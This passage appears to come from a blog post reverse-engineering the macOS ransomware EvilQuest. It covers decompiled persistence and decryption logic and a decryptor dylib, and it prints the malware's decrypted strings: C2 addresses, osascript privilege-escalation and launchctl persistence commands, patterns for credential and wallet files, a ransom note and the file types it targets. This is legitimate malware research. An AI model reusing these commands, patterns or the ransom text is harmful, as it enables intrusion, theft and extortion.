</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>This code invokes <code>time</code> twice, with a <code>sleep</code> in between &hellip;then compares if the differences between the two calls to <code>time</code> match the amount of time that was system slept for. Why? To detect sandboxes that patch (speedup) calls to <code>sleep</code>:</p>
<blockquote>
<p>&ldquo;<i>Sleep Patching
Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.</i>&rdquo; -<a href="https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes">www.isaca.org</a></p>
</blockquote>
<p>This means, that in reality the function is more of sandbox check, and may not detect a virtual machine. That&rsquo;s good news for our debugging efforts!</p>
<p>Continuing on, the malware invokes a method named <code>extract_ei</code>, which attempts to read 0x20 bytes of &ldquo;trailer&rdquo; data from within (the end?) of itself. However, as a function named <code>unpack_trailer</code> (invoked by <code>extract_ei</code>) returns 0 (<code>false</code>) as a check for <code>0DEADFACEh</code> fails, it appears that this sample does not contain the required &ldquo;trailer&rdquo; data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>;rcx: trailer data
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">0000000100004</span>A39                 cmp     dword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">0</span>DEADFACEh
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">0000000100004</span>A40                 mov     [rbp<span style="color:#f92672">+</span>var_38], rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">0000000100004</span>A44                 jz      leave</span></span></code></pre></div>
<p>With no trailer data found, the sample skips certain persistence logic &hellip;logic that appears to persist a daemon:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>;rcx: trailer data
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#66d9ef">if</span> (extract_ei(<span style="color:#f92672">*</span>var_10, <span style="color:#f92672">&amp;</span>var_40) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    _persist_executable_frombundle(var_48, var_40, var_30, <span style="color:#f92672">*</span>var_10);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    _install_daemon(var_30, _ei_str(<span style="color:#e6db74">&#34;0hC|h71FgtPJ32afft3EzOyU3xFA7q0{LBx...&#34;</span>), 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>                    _ei_str(<span style="color:#e6db74">&#34;0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD...&#34;</span>), <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    var_50 <span style="color:#f92672">=</span> _ei_str(<span style="color:#e6db74">&#34;0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD1m6d3j0000073&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    var_58 <span style="color:#f92672">=</span> _ei_str(<span style="color:#e6db74">&#34;20HBC332gdTh2WTNhS2CgFnL2WBs2l26jxCi0000013&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    var_60 <span style="color:#f92672">=</span> _ei_str(<span style="color:#e6db74">&#34;1PbP8y2Bxfxk0000013&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    _run_daemon_u(var_50, var_58, var_60);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    _run_target(<span style="color:#f92672">*</span>var_10);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>}</span></span></code></pre></div>
<p>It appears that various values of interest to us (such as the name/path of the daemon) are obfuscated. However, looks like the <code>_ei_str</code> function is responsible for the deobfuscation:</p>
<p>Looking at its decompilation, we see a one-time initialization of a variable named <code>_eib_string_key</code> and then a call into a function named <code>_eib_secure_decode</code> (which calls a method named <code>_tpdcrypt</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_ei_str</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    var_10 <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>_eib_string_key <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>            <span style="color:#f92672">*</span>_eib_string_key <span style="color:#f92672">=</span> _eip_decrypt(_eib_string_fa, <span style="color:#ae81ff">0x6b8b4567</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    var_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rax <span style="color:#f92672">=</span> strlen();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    rax <span style="color:#f92672">=</span> _eib_secure_decode(var_10, rax, <span style="color:#f92672">*</span>_eib_string_key, <span style="color:#f92672">&amp;</span>var_18);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    var_20 <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (var_20 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            var_8 <span style="color:#f92672">=</span> var_10;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            var_8 <span style="color:#f92672">=</span> var_20;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    rax <span style="color:#f92672">=</span> var_8;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>}</span></span></code></pre></div>
<p>Generally, we don&rsquo;t have to concern ourselves with the details of the deobfuscation (or decryption) algorithm, as we can simply set a debugger breakpoint at the end of the function, and print out the (now) plaintext string (which is held in the <code>RAX</code> register).</p>
<p>But let&rsquo;s at least dump the decryption key (<code>_eib_string_key</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) x/s $rdx
0x1001004c0: "PPK76!dfa82^g"
</pre>
</div>
<p>However, the &ldquo;downside&rdquo; to this approach is that we&rsquo;ll only decrypt strings when the malware invokes the <code>ei_str</code> function (and our debugger breakpoint is hit). Thus, if an encrypted string is (only) referenced in blocks of code that aren&rsquo;t executed, we won&rsquo;t ever see it&rsquo;s decrypted value. Of course we want to decrypt all the strings!</p>
<p>We know the malware can (obviously) decrypt all its strings (via the <code>ei_str</code> function), we just need a way to &ldquo;convince&rdquo; to do so! Turns out this isn&rsquo;t too hard. We simply create an injectable dynamic library that resolves the address of the malware&rsquo;s <code>ei_str</code> function, then invokes it for any/all encrypted strings! As we place all the logic in the constructor of the dynamic library, it is automatically executed when the library is loaded, before the malware&rsquo;s code is even run!</p>
<p>Here&rsquo;s the (well-commented) code from the injectable dynamic library:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>__attribute__((constructor)) <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> decrypt()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#75715e">//define &amp; resolve the malware&#39;s `ei_str` function
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> (<span style="color:#f92672">*</span>ei_str)(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> str);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  ei_str ei_strFP <span style="color:#f92672">=</span> dlsym(RTLD_MAIN_ONLY, <span style="color:#e6db74">&#34;ei_str&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#75715e">//init pointers
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the `__cstring` segment starts `0xF98D` after `ei_str` and is `0x29E9` long
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> start <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)ei_strFP <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xF98D</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> end <span style="color:#f92672">=</span> start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x29E9</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> current <span style="color:#f92672">=</span> start;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  <span style="color:#75715e">//decrypt all stings!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span>(current <span style="color:#f92672">&lt;</span> end)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#75715e">//decrypt
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> string <span style="color:#f92672">=</span> ei_strFP(current);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    printf(<span style="color:#e6db74">&#34;decrypted string (%#lx): %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)current, string);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#75715e">//next
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#75715e"></span>    current <span style="color:#f92672">+=</span> strlen(current);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>}</span></span></code></pre></div>
<p>In short, it simply scan over the entire <code>__cstring</code> segment (which contains all the encrypted strings), invoking the <code>ei_str</code> method on each encrypted string.</p>
<p>We compile and forcefully load this into the malware via the <code>DYLD_INSERT_LIBRARIES</code> environment variable. Once loaded our decryption logic is invokes and the coerces the malware to decrypt all it&rsquo;s strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
DYLD_INSERT_LIBRARIES=/tmp/libEvilQuestDecryptor.dylib /Library/mixednkey/toolroomd 

decrypted string (0x10eb675ec): andrewka6.pythonanywhere.com
decrypted string (0x10eb67624): ret.txt

decrypted string (0x10eb6764a): osascript -e "beep 18
say \"%s\" waiting until completion false
set alTitle to \"%s\"
set alText to \"%s\"
display alert alText message alTitle as critical buttons {\"OK\"}
set the clipboard to \"%s\""

decrypted string (0x10eb6778c): READ_ME_NOW.txt
decrypted string (0x10eb677b8): %s/Desktop/%s
decrypted string (0x10eb677d8): %s/Documents/%s
decrypted string (0x10eb67804): %s/Pictures/%s
decrypted string (0x10eb67824): %s/Movies/%s
decrypted string (0x10eb67844): %s/Hellper.app

decrypted string (0x10eb67864): osascript -e "do shell script \"sudo %s\" with administrator privileges"
decrypted string (0x10eb678e4): system.privilege.admin
decrypted string (0x10eb678fb): %s --reroot
decrypted string (0x10eb67907): launchctl submit -l 'questd' -p '%s'
decrypted string (0x10eb6794c): --silent

decrypted string (0x10eb67960): osascript -e "do shell script \"launchctl load -w %s;launchctl start %s\" with administrator privileges"
decrypted string (0x10eb67a10): osascript -e "do shell script \"launchctl load -w %s;launchctl start %s\""

decrypted string (0x10eb67a95): *id_rsa*/i
decrypted string (0x10eb67ab5): *.pem/i
decrypted string (0x10eb67ad5): *.ppk/i
decrypted string (0x10eb67af5): known_hosts/i
decrypted string (0x10eb67b15): *.ca-bundle/i
decrypted string (0x10eb67b35): *.crt/i
decrypted string (0x10eb67b55): *.p7!/i
decrypted string (0x10eb67b75): *.!er/i
decrypted string (0x10eb67b95): *.pfx/i
decrypted string (0x10eb67bb5): *.p12/i
decrypted string (0x10eb67bd5): *key*.pdf/i
decrypted string (0x10eb67bf5): *wallet*.pdf/i
decrypted string (0x10eb67c15): *key*.png/i
decrypted string (0x10eb67c35): *wallet*.png/i
decrypted string (0x10eb67c55): *key*.jpg/i
decrypted string (0x10eb67c75): *wallet*.jpg/i
decrypted string (0x10eb67c95): *key*.jpeg/i
decrypted string (0x10eb67cb5): *wallet*.jpeg/i

decrypted string (0x10eb67ce6): HelloCruelWorld
decrypted string (0x10eb67d12): [Memory Based Bundle]
decrypted string (0x10eb67d6b): ei_run_memory_hrd

decrypted string (0x10eb681ad): <?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;%s&lt;/string&gt;

&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;sudo&lt;/string&gt;
&lt;string&gt;%s&lt;/string&gt;
&lt;string&gt;--silent&lt;/string&gt;
&lt;/array&gt;

&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;

&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;

&lt;/dict&gt;
&lt;/plist&gt;
decrypted string (0x10eb68419): wb+
decrypted string (0x10eb6841d): %s/Library/
decrypted string (0x10eb6843f): /Library/AppQuest/com.apple.questd
decrypted string (0x10eb68483): /Library/AppQuest
decrypted string (0x10eb684af): %s/Library/AppQuest
decrypted string (0x10eb684db): %s/Library/AppQuest/com.apple.questd

decrypted string (0x10eb6851f): <?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;%s&lt;/string&gt;

&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;%s&lt;/string&gt;
&lt;string&gt;--silent&lt;/string&gt;
&lt;/array&gt;

&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;

&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;

&lt;/dict&gt;
&lt;/plist&gt;

decrypted string (0x10eb68767): questd
decrypted string (0x10eb6877b): com.apple.questd.plist
decrypted string (0x10eb687a7): /Library/LaunchDaemons/
decrypted string (0x10eb687df): %s/Library/LaunchAgents/
decrypted string (0x10eb68817): NCUCKOO7614S
decrypted string (0x10eb68837): 167.71.237.219
decrypted string (0x10eb68857): q?s=%s&h=%s
decrypted string (0x10eb68863): .xookc
decrypted string (0x10eb68877): osascript -e "do shell script \"sudo open %s\" with administrator privileges"
decrypted string (0x10eb688f7): Hi there
decrypted string (0x10eb6891b): .shcsh

decrypted string (0x10eb6893f): Little Snitch
decrypted string (0x10eb6895f): Kaspersky
decrypted string (0x10eb6897f): Norton
decrypted string (0x10eb68993): Avast
decrypted string (0x10eb689a7): DrWeb
decrypted string (0x10eb689bb): Mcaffee
decrypted string (0x10eb689db): Bitdefender
decrypted string (0x10eb689fb): Bullguard
decrypted string (0x10eb68a1b): com.apple.questd
decrypted string (0x10eb68a47): ookcucythguan

decrypted string (0x10eb68a67): Installer.app
decrypted string (0x10eb68a87): Setup
decrypted string (0x10eb68a9b): %s --ignrp
decrypted string (0x10eb68aa6): /Users
decrypted string (0x10eb68aba): --noroot
decrypted string (0x10eb68ac3): --ignrp
decrypted string (0x10eb68acb): %s/.ncspot
decrypted string (0x10eb68aeb): H2QGjSmA

decrypted string (0x10eb68b54): YOUR IMPORTANT FILES ARE ENCRYPTED

Many of your documents, photos, videos, images and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your file without our decryption service.

We use 256-bit AES algorithm so it will take you more than a billion years to break this encryption without knowing the key (you can read Wikipedia about AES if you don't believe this statement).
Anyways, we guarantee that you can recover your files safely and easily. This will require us to use some processing power, electricity and storage on our side, so there's a fixed processing fee of 50 USD. This is a one-time payment, no additional fees included.
In order to accept this offer, you have to deposit payment within 72 hours (3 days) after receiving this message, otherwise this offer will expire and you will lose your files forever.
Payment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the moment of payment. The address you have to make payment is:

                    %s

Decryption will start automatically within 2 hours after the payment has been processed and will take from 2 to 5 hours depending on the processing power of your computer. After that all of your files will be restored.

THIS OFFER IS VALID FOR 72 HOURS AFTER RECEIVING THIS MESSAGE
decrypted string (0x10eb6939c): 13roGMpWd7Pb3ZoJyce8eoQpfegQvGHHK7
decrypted string (0x10eb693bf): Your files are encrypted
decrypted string (0x10eb693f7): Many of your important documents, photos, videos, images and other files are no longer accessible because they have been encrypted.

Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.
We guarantee however that you can recover your files safely and easily and this will cost you 50 USD without any additional fees.

Our offer is valid FOR 3 DAYS (starting now!). Full details can be found in the file:  READ_ME_NOW.txt  located on your Desktop

decrypted string (0x10eb6997e): READ_ME_NOW
decrypted string (0x10eb6999e): .tar
decrypted string (0x10eb699b2): .rar
decrypted string (0x10eb699c6): .tgz
decrypted string (0x10eb699da): .zip
decrypted string (0x10eb699ee): .7z
decrypted string (0x10eb69a02): .dmg
decrypted string (0x10eb69a16): .gz
decrypted string (0x10eb69a2a): .jpg
decrypted string (0x10eb69a3e): .jpeg
decrypted string (0x10eb69a52): .png
decrypted string (0x10eb69a66): .gif
decrypted string (0x10eb69a7a): .psd
decrypted string (0x10eb69a8e): .eps
decrypted string (0x10eb69aa2): .mp4
decrypted string (0x10eb69ab6): .mp3
decrypted string (0x10eb69aca): .mov
decrypted string (0x10eb69ade): .avi
decrypted string (0x10eb69af2): .mkv
decrypted string (0x10eb69b06): .wav
decrypted string (0x10eb69b1a): .aif
decrypted string (0x10eb69b2e): .aiff
decrypted string (0x10eb69b42): .ogg
decrypted string (0x10eb69b56): .flac
decrypted string (0x10eb69b6a): .doc
decrypted string (0x10eb69b7e): .txt
decrypted string (0x10eb69b92): .docx
decrypted string (0x10eb69ba6): .xls
decrypted string (0x10eb69bba): .xlsx
decrypted string (0x10eb69bce): .pages
decrypted string (0x10eb69be2): .pdf
decrypted string (0x10eb69bf6): .rtf
decrypted string (0x10eb69c0a): .m4a
decrypted string (0x10eb69c1e): .csv
decrypted string (0x10eb69c32): .djvu
decrypted string (0x10eb69c46): .epub
decrypted string (0x10eb69c5a): .pub
decrypted string (0x10eb69c6e): .key
decrypted string (0x10eb69c82): .dwg
decrypted string (0x10eb69c96): .c
decrypted string (0x10eb69caa): .cpp
decrypted string (0x10eb69cbe): .h
decrypted string (0x10eb69cd2): .m
decrypted string (0x10eb69ce6): .php
decrypted string (0x10eb69cfa): .cgi
decrypted string (0x10eb69d0e): .css
decrypted string (0x10eb69d22): .scss
decrypted string (0x10eb69d36): .sass
decrypted string (0x10eb69d4a): .otf
decrypted string (0x10eb69d5e): .ttf
decrypted string (0x10eb69d72): .asc
decrypted string (0x10eb69d86): .cs
decrypted string (0x10eb69d9a): .vb
decrypted string (0x10eb69dae): .asp
decrypted string (0x10eb69dc2): .ppk
decrypted string (0x10eb69dd6): .crt
decrypted string (0x10eb69dea): .p7
decrypted string (0x10eb69dfe): .pfx
decrypted string (0x10eb69e12): .p12
decrypted string (0x10eb69e26): .dat
decrypted string (0x10eb69e3a): .hpp
decrypted string (0x10eb69e4e): .ovpn
decrypted string (0x10eb69e62): .download
decrypted string (0x10eb69e82): .pem
decrypted string (0x10eb69e96): .numbers
decrypted string (0x10eb69eb6): .keynote
decrypted string (0x10eb69ed6): .ppt
decrypted string (0x10eb69eea): .aspx
decrypted string (0x10eb69efe): .html
decrypted string (0x10eb69f12): .xml
decrypted string (0x10eb69f26): .json
decrypted string (0x10eb69f3a): .js
decrypted string (0x10eb69f4e): .sqlite
decrypted string (0x10eb69f6e): .pptx
decrypted string (0x10eb69f82): .pkg
</pre>
</div>
<p>In the decrypted output we find many revealing strings that appear to be:</p>
<ul>
<li>addresses of (command and control?) servers: <code>andrewka6.pythonanywhere.com</code>, <code>167.71.237.219</code>.</li>
<li>regexes for files of interest, relating to keys, certificates, and wallets: <code>*id_rsa*/i</code>, <code>*key*.pdf/i</code>, <code>*wallet*.pdf</code>, etc&hellip;</li>
<li>property list file(s) for launch item persistence.</li>
<li>security products: <code>Little Snitch</code>, <code>Kaspersky</code>, etc&hellip;</li>
<li>(de)ransom instructions, and target file extensions.</li>
</ul>
<div class="note">
<p>Scott Knight (<a href="https://twitter.com/sdotknight" class="inlineLink">@sdotknight</a>) has a created a lovely python script capable of decrypting strings (and other components) of OSX.EvilQuest.</p>
<center>
<a href="https://github.com/carbonblack/tau-tools/blob/master/malware_specific/ThiefQuest/thiefquest_decrypt.py" class="inlineLink">thiefquest_decrypt.py</a>
</center>
</div>
<p>Continuing on in our analysis, as this specimen does not appear to contain any &rsquo;trailer&rsquo; data, the code block (mentioned above) is skipped &hellip;however, the malware then invokes a function named <code>ei_persistence_main</code> which (also) persists the malware.</p>
<p>However, before persistence, the <code>ei_persistence_main</code> function invokes various anti-debugging logic, in an attempt to thwart dynamic debugging! Specifically it first calls a function named <code>is_debugging</code>. The <code>is_debugging</code> method is implemented at address <code>0x0000000100007AA0</code>. To check if it is being debugged, it invokes <code>sysctl</code> with <code>CTL_KERN</code>, <code>KERN_PROC</code>, <code>KERN_PROC_PID, and getpid()</code>. Once this has returned, it checks if the <code>P_TRACED</code> is set (in the <code>info.kp_pro</code> structure returned by <code>sysctl</code>). This is a common anti-debugger check, seen in other macOS malware:</p>
<img src="../images/blog/blog_0x59/antiDebug.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

